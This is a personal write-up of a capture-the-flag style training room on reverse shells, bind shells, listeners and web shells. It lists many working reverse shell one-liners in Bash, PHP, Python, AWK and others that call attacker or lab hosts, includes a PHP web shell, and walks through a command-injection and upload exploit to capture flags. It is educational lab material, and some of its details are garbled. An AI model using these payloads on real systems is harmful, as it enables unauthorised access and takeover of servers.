| [Home](../README.md) | [Cyber Security 101](../README.md#cyber-security-101) | **Shells Overview** |

## Contents
- [Room Introduction](#room-introduction)
- [Shell Overview](#shell-overview)
- [Reverse Shell](#reverse-shell)
- [Bind Shell](#bind-shell)
- [Shell Listeners](#shell-listeners)
- [Shell Payloads](#shell-payloads)
- [Web Shell](#web-shell)
- [Practical Task](#practical-task)


## Room Introduction
Shells, an important function in the attack chain. This room teaches us how to use different sells in offsec, and how to detect them.

There is no question for this task.


## Shell Overview
This section covers how users interact with Shells, with out a GUI. 

The types of shell are **Remove System Control**, having control over a target system, **Privilege Escalation**, having exploited a vulnerability to gain elevated permission, **Data Exfiltration** is where potentially sensitive data can be read and copied off of the target, **Persistence and Maintenance access** describes continued access after the initial _Privilege Escalation_, **Post-Exploitation Activities** describes anything after the initial privilege escalation such as malware installation, data removal, account creation etc., **Access Other Systems on the Network** could be classed as pivoting, accessing other systems on the network.

### ❓ Question
> What is the command-line interface that allows users to interact with an operating system?
#### 🧪 Process
The command-line interface is often classed as a terminal, but in this context we are referring to a `Shell`.

Trying this as the answer
#### ✅ Answer
- `Shell` ✅

### ❓ Question
> What process involves using a compromised system as a launching pad to attack other machines in the network?
#### 🧪 Process
When we have established access, potentially elevated privilages, we may wish to pivot to other systems, otherwise known as `pivoting`.

Trying this as the answer
#### ✅ Answer
- `pivoting` ✅

### ❓ Question
> What is a common activity attackers perform after obtaining shell access to escalate their privileges?
#### 🧪 Process
Once you have established shell access, you will be limited to what you an do until you perform `Privilege Escalation`.

Trying this as the answer
#### ✅ Answer
- `Privilege Escalation` ✅


## Reverse Shell
sometimes refferred to as a '_Connect Back Shell_', a popular technique for gaining access. Connection is tarted from target to attacker. Outbound traffic is often trusted over inbound traffic

### How Reverse Shells Work
We use a Netcat (`nc`) listener `nc -lvnp 443`
What doe the arguments mean?
- `-l` sets up the listener
- `-v` enables the verbose mode
- `-n` prevents DNS look-ups, forces IP
- `-p` as expected specifies a port to listen on.
- `443` in this example we are listing on port 443

We initiate the reverse shell using a vulnerability in a system, Pentest Monkey has a [cheetsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). 

One example
```shell
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
```

**`rm -f /tmp/f`**
Ensures nothing is in `/tmp/f` which in turn allows the creation of the pipe

**`mkfifo /tmp/f`**
Creates named pipe at `/tmp/f`. This allows bi-directional communication between processes.

**`cat /tmp/f`**
Reads the content of `/tmp/f` as a stream. Since it's its a file pipe, it will never completed.

**`| bash -i 2>&1`**
Any output from `cat` will be piped directly into an interactive bash shell (`bash -i`)., whilst `2>&1` essentially outputs stderr to to stdout, or in other terms, returns to the attacker, rather than the target.

**`| nc 1.2.3.4 443 >/tmp/f`**
This will then pipe the target shell to the attackers netcat session using the IP and port provided. 

**`>/tmp/f`**
Finally any output is parsed back to the file to complete bi-directional communication. 

Now the question is, can I exploit this on my own laptop? Lets try

This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

### Personal Exercise
Otherwise known as an ADHD tangent ;)

**Set up NC listener**
```shell
[archibold@ARCHIBOLD ~]$ nc 127.0.0.1 443
bash: nc: command not found
```

Well to start, I forgot the `-lvnp` arguments, but more critical, I don't even have _Netcat_ installed.

```shell
[archibold@ARCHIBOLD ~]$ sudo pacman -S nc
[sudo] password for archibold: 
error: target not found: nc
```

Okay, so maybe arch doesn't have nc... Maybe if I used the full name I might have more luck ;)
```shell
[archibold@ARCHIBOLD ~]$ sudo pacman -S netcat
:: There are 2 providers available for netcat:
:: Repository extra
   1) gnu-netcat  2) openbsd-netcat

Enter a number (default=1): 
resolving dependencies...
looking for conflicting packages...

Packages (1) gnu-netcat-0.7.1-10

Total Download Size:   0.03 MiB
Total Installed Size:  0.06 MiB

:: Proceed with installation? [Y/n] 
:: Retrieving packages...
 gnu-netcat-0.7.1-10-x86_64                 30.1 KiB   131 KiB/s 00:00 [########################################] 100%
(1/1) checking keys in keyring                                         [########################################] 100%
(1/1) checking package integrity                                       [########################################] 100%
(1/1) loading package files                                            [########################################] 100%
(1/1) checking for file conflicts                                      [########################################] 100%
(1/1) checking available disk space                                    [########################################] 100%
:: Processing package changes...
(1/1) installing gnu-netcat                                            [########################################] 100%
:: Running post-transaction hooks...
(1/2) Arming ConditionNeedsUpdate...
(2/2) Updating the info directory file...
```

Okay I went for the default _Netcat_ provider `gnu-netcat`. It looks to be installed, let's see if we can start the listener again...

```shell
[archibold@ARCHIBOLD ~]$ nc -lvnp 127.0.0.1 443
Error: Invalid local port: 127.0.0.1
[archibold@ARCHIBOLD ~]$ nc -lvnp 443
Error: Couldn`t setup listening socket (err=-3)
[archibold@ARCHIBOLD ~]$ sudo nc -lvnp 443


```

Okay, so there was some trial and error, first I put in the IP and port, apparently 127.0.0.1 wasn't a valid port. I wonder why. 

Then I tried running _`nc`_ without elevated privileges. That wasn't going to work...

Third times a charm. 

So now I have the listener working, I can try and get the reverse shell working.

### Starting Reverse Shell
This may not may or may not work on a local machine, but honestly I don't see why not so I'm going to try anyway.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 127.0.0.1 443 >/tmp/f`

Amazing, worked first time. For reference, the left window is the reverse shell whilst the right window is the listener or bind shell
![](Images/Pasted%20image%2020250622113920.png)

Interestingly, you can't just `sudo` as _`sudo`_ wants the password entered on the host machine. 
![](Images/Pasted%20image%2020250622114147.png)

### ❓ Question
> What type of shell opens a specific port on the target for incoming connections from the attacker?
#### 🧪 Process
The bind shell

Trying this as the answer
#### ✅ Answer
- `bind shell` ✅

### ❓ Question
> Listening below which port number requires root access or privileged permissions?
#### 🧪 Process
Oh I missed this, so apparently ports below **`1024`** require elevated privileges, hence why my example needed elevation, since I used port 443.

Trying this as the answer
#### ✅ Answer
- `8080`


## Shell Listeners
Apparently _`nc`_ isn't the only cat in town. 

There is **Rlwrap** which adds functionality to Netcat such as editing history, using arrow keys etc.

```shell
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Then there is **Ncat** which has extra security like SSL encryption#```shell-session
```shell
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```
setting up use with **SSL**
```shell
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

Finally, these examples there is **Socat** which allows creating connections between two sources. 
```shell
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

### ❓ Question
> Which flexible networking tool allows you to create a socket connection between two data sources?
#### 🧪 Process
This was **Socat**.

Trying this as the answer
#### ✅ Answer
- `Socat` ✅

### ❓ Question
> Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?
#### 🧪 Process
This was **Rlwrap**

Trying this as the answer
#### ✅ Answer
- `Rlwrap`

### ❓ Question
> What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?
#### 🧪 Process
This was **Ncat**

Trying this as the answer
#### ✅ Answer
- `Ncat`


## Shell Payloads
A shell payload could be a command or script that opens the shell to inbound connections.

### Bash
**Normal Bash Reverse Shell**
- Bash: -i >& /dev/tcp/1.2.3.4/443 0>&1`
	- Initiates interactive shell. IO redirected though TCP on specified port.  

**Bash Read line Reverse Shell**
- Bash: `exec 5<>/dev/tcp/1.2.3.4/443; cat <&5 | while read line; do $line 2>&5 >&5; done`
	- Creates new file descriptor. Connects over TCP. Reads and executes from socket and returns output via same socket.

**Bash With File Descriptor 196 Reverse Shell**
- Bash: `0<&196;exec 196<>/dev/tcp/1.2.3.4/443; sh <&196 >&196 2>&196`
	- Uses file descriptor to establish TCP connection. Reads commands and returns over same connection

**Bash With File Descriptor 5 Reverse Shell**
- Bash: `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`
	- Again, using file description `5`. Again IO over TCP.
### PHP
**PHP Reverse Shell Using the exec Function**
- PHP: `php -r '$sock=fsockopen("1.2.3.4",443);exec("sh <&3 >&3 2>&3");'`
	- Uses exec function to execute shell and redirects stdout and stdin

**PHP Reverse Shell Using the shell_exec Function**
- PHP: `php -r '$sock=fsockopen("1.2.3.4",443);shell_exec("sh <&3 >&3 2>&3");'`
	- Uses `shell_exec` instead

**PHP Reverse Shell Using the system Function**
- PHP: `php -r '$sock=fsockopen("1.2.3.4",443);system("sh <&3 >&3 2>&3");'`
	- Uses `system`

**PHP Reverse Shell Using the passthru Function**
- PHP: ``
	- Uses `popen` as file pointer
### Python
**Python Reverse Shell by Exporting Environment Variables**
- Python: `export RHOST="1.2.3.4"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`
	- Creates remote host & port as environmental variables.  sets up socket, and duplicates socket file descriptor for stdin/stdout

**Python Reverse Shell Using the subprocess Module**
- Python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`
	- Uses the `subprocess` module to spawn shell, then configure similar environment as python reverse shell after the Environmental Variables are exported.

**Short Python Reverse Shell**
- Python: `python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
	- Creates `s` socket connects attacker and uses stdin/stdout.

### Others
**Telnet**
- Telnet: `TF=$(mktemp -u); mkfifo $TF && telnet 1.2.3.4443 0<$TF | sh 1>$TF`
	- Creates named pipeline and connects attacker via telnet

**AWK**
- AWK:  `awk 'BEGIN {s = "/inet/tcp/0/1.2.3.4/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
	- Uses awk built in tcp to connect to attacker. Reads commands and returns over same TCP connection
**BusyBox**
- busybox: `busybox nc 1.2.3.4 443 -e sh`
	- Uses same process as nc

### ❓ Question
> Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?
#### 🧪 Process
Subprocess

Trying this as the answer
#### ✅ Answer
- `subprocess` ✅

### ❓ Question
> What shell payload method in a common scripting language uses the `exec`, `shell_exec`, `system`, `passthru`, and `popen` functions to execute commands remotely through a TCP connection?
#### 🧪 Process
These are all common with _PHP_.

Trying this as the answer
#### ✅ Answer
- `PHP` ✅

### ❓ Question
> Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?
#### 🧪 Process
The only scripting language we used here was python.

Trying this as the answer
#### ✅ Answer
- `python` ✅


## Web Shell
This section goes over how the webshell works. 

It uses the example of `shell.php` below which is uploaded to the web server. 

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Example rooms:
- ❓ [Upload Vulnerabilities](https://tryhackme.com/room/uploadvulns)
- ❓ [File Inclusion](https://tryhackme.com/room/fileinc)
- ❓ [Command Injection](https://tryhackme.com/room/oscommandinjection)

Once the `shell.php` file has been you can navigate to the file directly for example `http://example.com/uploads/shell.php`.

We can then issue commands via the command `?cmd=whoami` 

**Example**
- `http://example.com/uploads/shell.php?cmd=whoami`

### Shells available online
**[p0wny-shell](https://github.com/flozz/p0wny-shell)**
> p0wny@shell:~# is a very basic, single-file, PHP shell. It can be used to quickly execute commands on a server when pentesting a PHP application. Use it with caution: this script represents a security risk for the server.

**[b374k](https://github.com/b374k/b374k)**
> This PHP Shell is a useful tool for system or web administrator to do remote management without using cpanel, connecting using ssh, ftp etc. All actions take place within a web browser

**[c99 shell](https://www.r57shell.net/single.php?id=13)**
> A well-known and robust PHP web shell with extensive functionality.

An extensive list of web shells can be found at [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php).

### ❓ Question
> What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?
#### 🧪 Process
This capability is as a result of `unrestricted file upload`. 

Trying this as the answer
#### ✅ Answer
- `Unrestricted file upload` ✅

### ❓ Question
> What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?
#### 🧪 Process
The name of the section `web shell`.

Trying this as the answer
#### ✅ Answer
- `web shell` ✅


## Practical Task

In this practical task we are looking for the flags. See the questions below

Pre-work,

Navigate to http://10.10.180.125:8080 to see what is there:
![](Images/Pasted%20image%2020250622150311.png)

There are two links, a _Reverse/Bind Shell Task_ and a _Web Shell Task_

Clicking on the _Reverse/Bind Shell Task_ takes you to http://10.10.180.125:8081/
![](Images/Pasted%20image%2020250622150434.png)

If we go back and navigate to _Web Shell Task_ which takes us to http://10.10.180.125:8082/.
![](Images/Pasted%20image%2020250622150805.png)



### ❓ Question
> Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?
#### 🧪 Process
Navigated to http://10.10.180.125:8081/

Presented with 
![](Images/Pasted%20image%2020250622150434.png)

Created listener using `nc -lvnp 8080`
![](Images/Pasted%20image%2020250622152340.png)

Returned to web page and pasted in `;php -r '$sock=fsockopen("10.10.229.87",8080);shell_exec("sh <&3 >&3 2>&3");';` and hit return

Ordinarily the page would return a hash back fairly quickly, however this time, it looks as though nothing is happening. 
![](Images/Pasted%20image%2020250622152603.png)

Let's return back to the listener and see if we have anything...

We how have a connection received notice

Let's run a command (`ls`) to see if it is working
![](Images/Pasted%20image%2020250622152736.png)

Result, now the question asks about flag saved in `/`. We can navigate to that and perform another `ls`.
![](Images/Pasted%20image%2020250622152824.png)

Okay, and there it is, `flag.txt` we can use `cat` to show the content and hopefully that will give us our flag.
![](Images/Pasted%20image%2020250622152921.png)

Boom! There it is `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`.

Trying this as the answer
#### ✅ Answer
- `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}` ✅

### ❓ Question
> Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?
#### 🧪 Process
Navigate to _Web Shell Task_.
![](Images/Pasted%20image%2020250622150805.png)
As the room suggests, there is not likely to be any file validation on the upload. So we can grab a pre-made shell.

I choose to use the _p0wny-shell_.

Navigated to the github repository (https://github.com/flozz/p0wny-shell) and clicked `shell.php
![](Images/Pasted%20image%2020250622154817.png)

Clicked Raw to make it easier to copy paste
![](Images/Pasted%20image%2020250622155018.png)

Paste into _sublime-text_ and saved it as ~/Downloads/resume.php. You know, just to keep the theme.
![](Images/Pasted%20image%2020250622155120.png)

Navigate back to the page, click **Browse**, navigate to _~/Downloads_ and double click **resume.php**, then click **Upload Your CV**. Once uploaded you will see a confirmation
![](Images/Pasted%20image%2020250622155323.png)

Let's go find the file, we can assume `uploads` so replace `index.php` with `/uploads/resume.php`
![](Images/Pasted%20image%2020250622155430.png)

In, Like, Flynn.

Let's `cat` the flag.
![](Images/Pasted%20image%2020250622155509.png)

Trying this as the answer
#### ✅ Answer
- `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}` ✅
